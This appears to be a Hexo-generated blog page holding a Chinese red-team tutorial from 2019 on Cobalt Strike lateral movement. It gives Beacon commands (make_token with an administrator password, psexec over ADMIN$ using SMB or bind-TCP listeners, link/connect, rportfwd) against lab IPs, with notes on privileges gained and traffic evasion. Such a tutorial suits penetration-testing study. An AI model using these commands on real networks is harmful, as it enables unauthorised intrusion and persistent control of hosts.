@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="cobaltstrike在横向移动中的上线技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cobaltstrike在横向移动中的上线技巧">
+<meta property="og:url" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="李三的剑谱">
+<meta property="og:description" content="cobaltstrike在横向移动中的上线技巧">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563712543324.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563712694799.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563713352498.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563764126695.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563765538981.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563765344629.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563766274358.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563766369946.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563766738365.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563767495178.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563768282165.png">
+<meta property="article:published_time" content="2019-11-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-12-21T13:25:59.849Z">
+<meta property="article:author" content="李三（cl0und）">
+<meta property="article:tag" content="cobaltstrike">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/1563712543324.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>cobaltstrike在横向移动中的上线技巧 | 李三的剑谱</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">李三的剑谱</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="李三（cl0und）">
+      <meta itemprop="description" content="人若无名，便可专心练剑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="李三的剑谱">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          cobaltstrike在横向移动中的上线技巧
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-11-22 00:00:00" itemprop="dateCreated datePublished" datetime="2019-11-22T00:00:00+08:00">2019-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-21 21:25:59" itemprop="dateModified" datetime="2019-12-21T21:25:59+08:00">2019-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/redteam-trick/" itemprop="url" rel="index">
+                    <span itemprop="name">redteam trick</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>2 mins.</span>
+            </span>
+            <div class="post-description">cobaltstrike在横向移动中的上线技巧</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="cobaltstrike-psexec"><a href="#cobaltstrike-psexec" class="headerlink" title="cobaltstrike psexec"></a>cobaltstrike psexec</h2><p>在进行pexecz之前一般需要用rev2vself回到原来的回话和克隆token</p>
+<ul>
+<li>rev2self:  Revert to your original access token</li>
+<li>make_token:  Clone the current access token and set it up to pass the specified username<br>and password when you interact with network resources. This command does not<br>validate the credentials you provide and it has no effect on local actions.</li>
+<li>psexec: Spawn a session on a remote host. This command generates an executable, copies it to the target, creates a service to run it, and cleans up after itself. You must specify which share (e.g., ADMIN$ or C$) to copy the file to.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">make_token administrator aaa123!@#</span><br><span class="line">psexec 192.168.20.30 ADMIN$ smb-bind-pipe</span><br></pre></td></tr></table></figure>
+smb-bind-pipe是建立的smb监听器的名字，创建smb监听器的时候会要求输入端口，不知道意义何在，随便填一个就好。</li>
+</ul>
+<p>用这种方法上线的权限是系统权限<br><img src="./1563712543324.png" alt="Alt text"></p>
+<p>ps：后来看cs输出，填的端口号会是命名管道的一部分，这样好处就是可以在一个机器上开多个管道吧<br><img src="./1563712694799.png" alt="Alt text"></p>
+<h2 id="cobaltstrike-smb-pipe"><a href="#cobaltstrike-smb-pipe" class="headerlink" title="cobaltstrike smb pipe"></a>cobaltstrike smb pipe</h2><p>其实上面psexec指定的是smb-bind-pipe listener，那么psexec成功后通信方式就是基于smb。使用smb的好处可以一定程度上规避流量审查。另外一种使用smb办法就是生成windows executes，在目标机器上运行然后link，这种方法拿到的就是，运行这个exe用户的权限而不是system权限。</p>
+<p>Use: link [ip address]<br>Link to the Beacon at the specified IP address.</p>
+<p><img src="./1563713352498.png" alt="Alt text"></p>
+<p>ps:<strong>在使用unlink的时候smb pipe都会断掉，但是smb pipe的进程并不会退出，link两次后通过psexec和运行exe的shell都会恢复</strong></p>
+<h2 id="cobaltstrike-bind-tcp"><a href="#cobaltstrike-bind-tcp" class="headerlink" title="cobaltstrike bind tcp"></a>cobaltstrike bind tcp</h2><p>建立listener后和smb一样，可以用psexec</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">make_token administrator aaa123!@#</span><br><span class="line">psexec 192.168.20.30 ADMIN$ bind-tcp</span><br></pre></td></tr></table></figure>
+<p>也可以生成exe，然后使用connect连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.20.30</span><br></pre></td></tr></table></figure>
+<p>需要说明的是创建监听器的时候填写的端口并没有什么用<br><img src="./1563764126695.png" alt="Alt text"><br>实际监听的时候还是监听的4444端口<br><img src="./1563765538981.png" alt="Alt text"></p>
+<p>加上smb，和tcp，拓扑图如下，蓝色是tcp，黄色是smb<br><img src="./1563765344629.png" alt="Alt text"></p>
+<p>ps：<strong>smb和tcp的相同点在于，unlink会同时断掉tcp和smb会话，不同点在于smb可以通过link连接回来，但是connect无法连接回来tcp，原因在于unlink后smb类型进程还是存在，但是tcp的unlink后进程会退出。</strong></p>
+<h2 id="cobaltstrike-reverse-tcp"><a href="#cobaltstrike-reverse-tcp" class="headerlink" title="cobaltstrike reverse tcp"></a>cobaltstrike reverse tcp</h2><p>cs3.13之后新更新的一个listener，相当nice的一点是Linux跳板机上也支持这种操作，不过在创建listener的时候并不会出现。<br><img src="./1563766274358.png" alt="Alt text"></p>
+<p>找到它需要在<br><img src="./1563766369946.png" alt="Alt text"></p>
+<p><img src="./1563766738365.png" alt="Alt text"></p>
+<p>命令行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 23333 windows&#x2F;beacon_reverse_tcp</span><br><span class="line"></span><br><span class="line">Use: rportfwd [bind port] [forward host] [forward port]</span><br><span class="line">     rportfwd stop [bind port]</span><br><span class="line"></span><br><span class="line">Binds the specified port on the target host. When a connection comes in,</span><br><span class="line">Cobalt Strike will make a connection to the forwarded host&#x2F;port and use Beacon</span><br><span class="line">to relay traffic between the two connections.</span><br></pre></td></tr></table></figure>
+
+
+<p>比较“奇怪“的是，这个监听器不能在psexec的执行，只能在生成stageless的时候找到<br><img src="./1563767495178.png" alt="Alt text"></p>
+<p>上线可以看到反向的绿色线，这种方法有个弊端，因为监听的端口往往不是默认放行的端口，所以要求边界机器要关闭防火墙。。。<br><img src="./1563768282165.png" alt="Alt text"></p>
+<p>ps：reverse同样受到unlink的影响</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s/aCWFlp0AzFd0Ou3wrDVu1g" target="_blank" rel="noopener">Cobalt Strike几种不那么常见的上线方式小记</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>李三（cl0und）
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/" title="cobaltstrike在横向移动中的上线技巧">http://yoursite.com/2019/11/22/cobaltstrike在横向移动中的上线技巧/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/cobaltstrike/" rel="tag"># cobaltstrike</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/11/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BB%E6%89%BE%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%87%E7%A8%8B/" rel="prev" title="记一次简单的寻找前端加密爆破的逻辑过程">
+      <i class="fa fa-chevron-left"></i> 记一次简单的寻找前端加密爆破的逻辑过程
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/11/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B0%83%E8%AF%95Commons%20Collections5%E9%81%87%E5%88%B0%E7%9A%84%E5%B0%8F%E5%9D%91/" rel="next" title="记一次调试Commons Collections5遇到的小坑">
+      记一次调试Commons Collections5遇到的小坑 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cobaltstrike-psexec"><span class="nav-number">1.</span> <span class="nav-text">cobaltstrike psexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cobaltstrike-smb-pipe"><span class="nav-number">2.</span> <span class="nav-text">cobaltstrike smb pipe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cobaltstrike-bind-tcp"><span class="nav-number">3.</span> <span class="nav-text">cobaltstrike bind tcp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cobaltstrike-reverse-tcp"><span class="nav-number">4.</span> <span class="nav-text">cobaltstrike reverse tcp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number"></span> <span class="nav-text">参考</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">李三（cl0und）</p>
+  <div class="site-description" itemprop="description">人若无名，便可专心练剑</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://7o8v.me/" title="http:&#x2F;&#x2F;7o8v.me&#x2F;" rel="noopener" target="_blank">7o8v☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://evoa.me/" title="https:&#x2F;&#x2F;evoa.me&#x2F;" rel="noopener" target="_blank">evoA☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kkdlong.win/" title="http:&#x2F;&#x2F;kkdlong.win&#x2F;" rel="noopener" target="_blank">kkdlong☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.l0ca1.xyz/" title="https:&#x2F;&#x2F;blog.l0ca1.xyz&#x2F;" rel="noopener" target="_blank">l0cal☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">l1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/iamstudy/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamstudy&#x2F;" rel="noopener" target="_blank">l3m0n☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://8sec.cc/" title="http:&#x2F;&#x2F;8sec.cc&#x2F;" rel="noopener" target="_blank">裤衩哥的小屋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://abcdefghijklmnopqrst.xyz/" title="http:&#x2F;&#x2F;abcdefghijklmnopqrst.xyz" rel="noopener" target="_blank">骑麦兜看落日☘️</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李三（cl0und）</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">153k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">2:19</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.1.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.6.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
